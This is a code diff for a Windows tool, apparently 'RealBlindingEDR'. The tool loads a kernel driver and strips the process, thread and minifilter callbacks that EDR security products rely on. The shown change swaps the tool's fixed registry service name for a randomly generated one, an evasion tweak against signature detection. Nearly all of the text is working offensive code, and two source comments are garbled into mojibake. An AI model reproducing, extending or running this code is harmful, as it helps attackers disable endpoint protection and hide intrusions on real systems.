@@ -5,10 +5,11 @@ DWORD dwMajor = 0;
 DWORD dwMinorVersion = 0;
 DWORD dwBuild = 0;
 INT64 EDRIntance[500] = { 0 };
+TCHAR* RandomName = NULL;
 BOOL LoadDriver() {
 	HKEY hKey;
 	HKEY hsubkey;
-	if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet", 0, 2u, &hKey) && !RegCreateKeyW(hKey, L"RealBlindingEDR", &hsubkey)) {
+	if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet", 0, 2u, &hKey) && !RegCreateKeyW(hKey, RandomName, &hsubkey)) {
 		CHAR* pdata = (CHAR*)calloc(1024, 1);
 		if (pdata == NULL) return FALSE;
 		memcpy(pdata, "\\??\\", strlen("\\??\\"));
@@ -25,15 +26,13 @@ BOOL LoadDriver() {
 		}
 
 		if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\services", 0, 2u, &hKey)) {
-			RegCreateKeyW(hKey, L"RealBlindingEDR", &hsubkey);
+			RegCreateKeyW(hKey, RandomName, &hsubkey);
 		}
 		else {
 			printf("Step3 Error\n");
 			return FALSE;
 		}
 		RegCloseKey(hKey);
-
-		INT errcode;
 
 		HMODULE hMoudle = LoadLibraryA("ntdll.dll");
 		if (hMoudle == NULL) {
@@ -52,8 +51,10 @@ BOOL LoadDriver() {
 		}
 
 		UNICODE_STRING szSymbolicLink;
-		RtlInitUnicodeString(&szSymbolicLink, (wchar_t*)L"\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
-		errcode = NtLoadDriver(&szSymbolicLink);
+		TCHAR LinkPath[100] = L"\\Registry\\Machine\\System\\CurrentControlSet\\";
+		lstrcat(LinkPath, RandomName);
+		RtlInitUnicodeString(&szSymbolicLink, LinkPath);
+		INT errcode = NtLoadDriver(&szSymbolicLink);
 		if (errcode >= 0)
 		{
 			return TRUE;
@@ -92,7 +93,9 @@ VOID UnloadDrive() {
 
 	RtlInitUnicodeStringPtr RtlInitUnicodeString = (RtlInitUnicodeStringPtr)GetProcAddress(hMoudle, "RtlInitUnicodeString");
 	UNICODE_STRING szSymbolicLink;
-	RtlInitUnicodeString(&szSymbolicLink, (wchar_t*)L"\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
+	TCHAR LinkPath[100] = L"\\Registry\\Machine\\System\\CurrentControlSet\\";
+	lstrcat(LinkPath, RandomName);
+	RtlInitUnicodeString(&szSymbolicLink, LinkPath);
 	NtUnLoadDriverPtr NtUnLoadDriver = (NtUnLoadDriverPtr)GetProcAddress(hMoudle, "NtUnloadDriver");
 
 	int errcode = NtUnLoadDriver(&szSymbolicLink);
@@ -105,7 +108,7 @@ VOID UnloadDrive() {
 	}
 }
 BOOL InitialDriver() {
-	//win7 加载此驱动崩溃，和后面代码逻辑无关
+	//win7 鍔犺浇姝ら┍鍔ㄥ穿婧冿紝鍜屽悗闈唬鐮侀�昏緫鏃犲叧
 	if (Driver_Type == 1) {
 		hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hDevice == INVALID_HANDLE_VALUE) {
@@ -259,7 +262,6 @@ INT64 GetFuncAddress(CHAR* ModuleName, CHAR* FuncName) {
 	INT64 Offset = (INT64)PocAddress - (INT64)ntos;
 	return (INT64)KBase + Offset;
 }
-
 
 INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {
 
@@ -553,7 +555,7 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		CHAR* DriverName2 = GetDriverName(EDRPostOperation);
 		if (DriverName2 != NULL) {
 			if (IsEDR(DriverName2)) {
-				//清除回调
+				//娓呴櫎鍥炶皟
 				DriverWriteMemery(data, (VOID*)(Flink + 48), 8);
 				if (flag == 1) {
 					printf("Process PreOperation: %s [Clear]\n", DriverName2);
@@ -945,6 +947,23 @@ VOID ClearMiniFilterCallback() {
 
 }
 
+VOID GenerateRandomName() {
+	srand((UINT)time(NULL));
+
+	INT length = rand() % 4 + 7;
+	TCHAR charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	RandomName = (TCHAR*)calloc(length*2 + 12,1);
+	if (RandomName) {
+		for (INT i = 0; i < length; ++i) {
+			INT index = rand() % (INT)(lstrlen(charset) - 1);
+			RandomName[i] = charset[index];
+		}
+	}
+	else {
+		printf("Random Error!\n");
+		ExitProcess(0);
+	}
+}
 int main(int argc, char* argv[])
 {
 	printf(" _______               __  ______  __   _               __  _               ________ ______  _______     \n");
@@ -961,6 +980,7 @@ int main(int argc, char* argv[])
 	DrivePath = argv[1];
 	Driver_Type = atoi(argv[2]);
 
+	GenerateRandomName();
 	HINSTANCE hinst = LoadLibraryA("ntdll.dll");
 	if (hinst == NULL) return FALSE;
 	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
